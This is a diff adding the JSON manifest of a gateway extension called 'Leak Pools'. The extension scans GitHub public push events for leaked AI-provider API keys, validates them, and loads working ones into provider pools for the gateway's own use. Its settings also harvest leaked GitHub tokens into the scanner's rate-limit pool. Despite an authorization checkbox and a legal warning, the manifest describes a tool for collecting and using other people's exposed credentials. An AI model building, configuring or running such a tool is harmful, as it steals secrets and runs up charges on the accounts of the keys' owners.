@@ -1,0 +1,362 @@
+{
+  "schema": 1,
+  "id": "leak-pools",
+  "name": "Leak Pools",
+  "tagline": "Scan GitHub pushes for leaked API keys and feed them into provider pools",
+  "description": "Watch GitHub public push events for exposed provider API keys, validate each candidate without spending it, and register working keys as pool-only providers in AuroraX. The first valid key of a service creates a pool such as leak-openai; distinct keys get their own alternative pools leak-openai_2, leak-openai_3, and so on, while pool_mode=shared keeps one pool per service. Keys are revalidated on a schedule and removed from the pool and the gateway when they stop authenticating. The extension also runs its own rotating GitHub token pool so the scan quota scales per GitHub account. GitHub is the only source; there is no Telegram or webhook integration, and keys are only sent to the provider they belong to during validation.",
+  "version": "2",
+  "author": "aurora",
+  "homepage": "",
+  "license": "MIT",
+  "type": "sidecar",
+  "provides": {
+    "features": [
+      "leak-scanning"
+    ]
+  },
+  "requirements": [
+    "A GitHub token for the scanner's own quota: a classic PAT with no scopes is enough for public events (5,000 requests/hour per account).",
+    "Young keys may require a billing method on the provider account before they can serve requests; validation only checks authentication.",
+    "The AuroraX admin API must be reachable from the gateway, normally http://127.0.0.1:<PORT>.",
+    "Authorization to test any key the scanner finds. Importing someone else's credentials can violate provider terms and law."
+  ],
+  "notes": [
+    "Scanning is disabled until enabled=true and legal_ack=true.",
+    "The addon stores its findings, managed keys and GitHub token pool in configs/extensions/leak-pools/leak-pools-state.json.",
+    "Only the provider's own models endpoint is used for validation and model discovery; no chat or completion call is made.",
+    "Removing a managed key deletes the provider it created and its membership in the managed pool.",
+    "Installation tokens (ghs_...) are validated but never added to the scan rotation: the events feed needs a user-scoped token.",
+    "Anthropic OAuth tokens (sk-ant-oat01-...) are detected and validated with a Bearer header but not imported, because the gateway's Anthropic provider authenticates with x-api-key.",
+    "Disabled provider overrides still reserve their names, so imported providers and pools never collide with an operator-disabled provider.",
+    "The addon is a single-file Yaegi runtime and needs no gateway rebuild."
+  ],
+  "settings": {
+    "enabled": "false",
+    "legal_ack": "false",
+    "create_pools": "true",
+    "pool_mode": "per_key",
+    "pool_prefix": "leak",
+    "services": "openai,anthropic,deepseek,openrouter,google,groq",
+    "github_token": "",
+    "github_tokens": "",
+    "harvest_github_tokens": "true",
+    "admin_url": "",
+    "admin_key": "",
+    "poll_interval": "30",
+    "per_page": "100",
+    "max_pushes_per_cycle": "25",
+    "max_imports_per_cycle": "5",
+    "min_entropy": "3.6",
+    "validate_keys": "true",
+    "revalidate_minutes": "60",
+    "reconcile_minutes": "10",
+    "delete_dead": "true",
+    "auto_fetch_models": "true",
+    "pool_only": "true",
+    "github_api": "https://api.github.com",
+    "allow_anonymous": "false",
+    "request_timeout_seconds": "10"
+  },
+  "ui": {
+    "accent": "#f7768e",
+    "docs_url": "",
+    "help": "Start on the Setup tab: read the authorization note, paste a GitHub token and enable the scanner. A classic personal access token with no scopes is enough for public events and compare calls; each GitHub account adds 5,000 requests/hour. Working provider keys become pool-only providers, and the first key of each service creates a pool named leak-<service>. Distinct keys get leak-<service>_2, _3, ... when pool_mode is per_key.",
+    "fields": [
+      {
+        "key": "legal_ack",
+        "label": "I am authorized to test the keys this scanner finds",
+        "type": "boolean",
+        "default": "false",
+        "description": "Required. Scanning stays paused until this is on. Use the scanner only for authorized security research, on keys you are allowed to test."
+      },
+      {
+        "key": "enabled",
+        "label": "Enable scanning",
+        "type": "boolean",
+        "default": "false",
+        "description": "Starts the background scan loop. Pools are only created for keys that were validated after both this and the authorization acknowledgment are on."
+      },
+      {
+        "key": "github_token",
+        "label": "GitHub token",
+        "type": "text",
+        "default": "",
+        "secret": true,
+        "description": "Recommended: a classic personal access token (ghp_...). No scopes are needed for public /events and /compare calls, so leave every checkbox empty. Fine-grained (github_pat_...), OAuth (gho_...) and app user (ghu_...) tokens are accepted and grouped by account. Installation tokens (ghs_...) are recognized but not used for the events scan because that feed is user-scoped."
+      },
+      {
+        "key": "github_tokens",
+        "label": "Additional GitHub tokens",
+        "type": "textarea",
+        "default": "",
+        "secret": true,
+        "description": "One token per line. Tokens from different GitHub accounts add 5,000 requests/hour each; tokens from the same account share that account's budget. The scanner rotates them and quarantines rate-limited tokens. Installation tokens (ghs_...) are listed as unsupported because the events feed requires a user token."
+      },
+      {
+        "key": "create_pools",
+        "label": "Create provider pools",
+        "type": "boolean",
+        "default": "true",
+        "description": "Create a pool for each supported service and add working keys to it. AuroraX pools need at least one member, so the first valid key creates the pool."
+      },
+      {
+        "key": "pool_mode",
+        "label": "Pool layout",
+        "type": "select",
+        "options": [
+          "per_key",
+          "shared"
+        ],
+        "default": "per_key",
+        "description": "per_key gives every distinct key its own pool: leak-openai, leak-openai_2, leak-openai_3, ... shared keeps one pool per service and adds every key as a member."
+      },
+      {
+        "key": "services",
+        "label": "Services to import",
+        "type": "textarea",
+        "default": "openai,anthropic,deepseek,openrouter,google,groq",
+        "description": "Comma-separated service ids, or * for every supported service. Leave it empty to import nothing. GitHub tokens always feed the scanner's own pool and are never imported as a model provider."
+      },
+      {
+        "key": "delete_dead",
+        "label": "Remove dead keys automatically",
+        "type": "boolean",
+        "default": "true",
+        "description": "When a managed key stops authenticating, remove it from its pool and delete the provider it created. Off keeps it visible with status=dead."
+      },
+      {
+        "key": "pool_prefix",
+        "label": "Pool name prefix",
+        "type": "text",
+        "default": "leak",
+        "advanced": true,
+        "description": "Prefix for generated pool and provider names. The service id is appended: <prefix>-openai."
+      },
+      {
+        "key": "harvest_github_tokens",
+        "label": "Harvest GitHub tokens from pushes",
+        "type": "boolean",
+        "default": "true",
+        "advanced": true,
+        "description": "Add valid GitHub tokens found in diffs to the scanner's own token pool. They are never imported as Aurora providers."
+      },
+      {
+        "key": "validate_keys",
+        "label": "Validate before importing",
+        "type": "boolean",
+        "default": "true",
+        "advanced": true,
+        "description": "Check each candidate against the provider's models endpoint before it becomes a provider. Turning this off marks findings unvalidated and imports nothing."
+      },
+      {
+        "key": "auto_fetch_models",
+        "label": "Populate provider models",
+        "type": "boolean",
+        "default": "true",
+        "advanced": true,
+        "description": "Store the models returned by the provider's models endpoint on the created provider and refresh them during revalidation."
+      },
+      {
+        "key": "pool_only",
+        "label": "Hide member models behind the pool",
+        "type": "boolean",
+        "default": "true",
+        "advanced": true,
+        "description": "Mark imported providers as pool_only so only the pool-qualified model routes are exposed, matching the per-key pool layout."
+      },
+      {
+        "key": "poll_interval",
+        "label": "GitHub poll interval (seconds)",
+        "type": "number",
+        "default": "30",
+        "advanced": true,
+        "description": "How often public push events are checked. The addon never polls faster than every 15 seconds."
+      },
+      {
+        "key": "per_page",
+        "label": "Events per poll",
+        "type": "number",
+        "default": "100",
+        "advanced": true,
+        "description": "Page size for the GitHub events feed, 1-100."
+      },
+      {
+        "key": "max_pushes_per_cycle",
+        "label": "Max pushes per cycle",
+        "type": "number",
+        "default": "25",
+        "advanced": true,
+        "description": "Upper bound on compare calls per poll, which caps GitHub quota use when the feed is busy."
+      },
+      {
+        "key": "max_imports_per_cycle",
+        "label": "Max imports per cycle",
+        "type": "number",
+        "default": "5",
+        "advanced": true,
+        "description": "Valid keys beyond this budget are queued and retried on later cycles."
+      },
+      {
+        "key": "min_entropy",
+        "label": "Minimum entropy",
+        "type": "number",
+        "default": "3.6",
+        "advanced": true,
+        "description": "Shannon entropy floor for a candidate. DeepSeek keys use stricter context heuristics in addition to this value."
+      },
+      {
+        "key": "revalidate_minutes",
+        "label": "Revalidate every (minutes)",
+        "type": "number",
+        "default": "60",
+        "advanced": true,
+        "description": "How often managed keys are checked again and dead keys removed."
+      },
+      {
+        "key": "reconcile_minutes",
+        "label": "Reconcile every (minutes)",
+        "type": "number",
+        "default": "10",
+        "advanced": true,
+        "description": "How often local state is compared with the gateway so operator deletions are respected instead of recreated."
+      },
+      {
+        "key": "admin_url",
+        "label": "AuroraX admin URL",
+        "type": "text",
+        "default": "",
+        "advanced": true,
+        "description": "Base URL of this gateway, for example http://127.0.0.1:8080. Empty derives it from PORT and BASE_PATH."
+      },
+      {
+        "key": "admin_key",
+        "label": "Admin key",
+        "type": "text",
+        "default": "",
+        "secret": true,
+        "advanced": true,
+        "description": "Master or admin key used for provider and pool calls. Empty falls back to AURORA_MASTER_KEY and then the gateway config."
+      },
+      {
+        "key": "request_timeout_seconds",
+        "label": "HTTP timeout (seconds)",
+        "type": "number",
+        "default": "10",
+        "advanced": true,
+        "description": "Timeout for GitHub, provider validation and admin API requests."
+      },
+      {
+        "key": "github_api",
+        "label": "GitHub API base URL",
+        "type": "text",
+        "default": "https://api.github.com",
+        "advanced": true,
+        "description": "Change only for a GitHub Enterprise instance or a local proxy."
+      },
+      {
+        "key": "allow_anonymous",
+        "label": "Allow anonymous GitHub polling",
+        "type": "boolean",
+        "default": "false",
+        "advanced": true,
+        "description": "Permit the scan to continue when every token is exhausted. Anonymous GitHub requests are limited to 60/hour and should only be used for a quick test."
+      }
+    ],
+    "nav": [
+      {
+        "id": "leak-pools",
+        "label": "Leak Pools",
+        "to": "leak-pools",
+        "icon": "key",
+        "order": 45
+      }
+    ],
+    "pages": [
+      {
+        "id": "leak-pools",
+        "path": "leak-pools",
+        "title": "Leak Pools",
+        "icon": "key",
+        "order": 45,
+        "summary": "GitHub leak scan, validated keys and the provider pools that use them",
+        "blocks": [
+          {
+            "kind": "text",
+            "source": "status",
+            "refresh": 15,
+            "text": "Scanner status"
+          },
+          {
+            "kind": "text",
+            "source": "findings",
+            "refresh": 30,
+            "text": "Recent findings"
+          },
+          {
+            "kind": "text",
+            "source": "pools",
+            "refresh": 30,
+            "text": "Managed pools"
+          },
+          {
+            "kind": "text",
+            "source": "github",
+            "refresh": 60,
+            "text": "GitHub token pool"
+          },
+          {
+            "kind": "text",
+            "source": "services",
+            "refresh": 60,
+            "text": "Services"
+          }
+        ]
+      }
+    ],
+    "settings_tabs": [
+      {
+        "id": "leak-pools-setup",
+        "label": "Leak Pools",
+        "icon": "key",
+        "order": 55,
+        "blocks": [
+          {
+            "kind": "heading",
+            "text": "Leak Pools"
+          },
+          {
+            "kind": "text",
+            "source": "setup",
+            "refresh": 30,
+            "text": "Setup and GitHub token guidance"
+          },
+          {
+            "kind": "divider"
+          },
+          {
+            "kind": "text",
+            "source": "status",
+            "refresh": 15,
+            "text": "Status"
+          }
+        ]
+      }
+    ],
+    "widgets": [
+      {
+        "id": "leak-pools-widget",
+        "slot": "overview",
+        "title": "Leak Pools",
+        "kind": "stats",
+        "source": "status",
+        "refresh": 30,
+        "order": 45
+      }
+    ]
+  },
+  "files": {
+    "leak-pools-runtime.go": {
+      "ref": "leak-pools/leak-pools-runtime.go"
+    }
+  }
+}
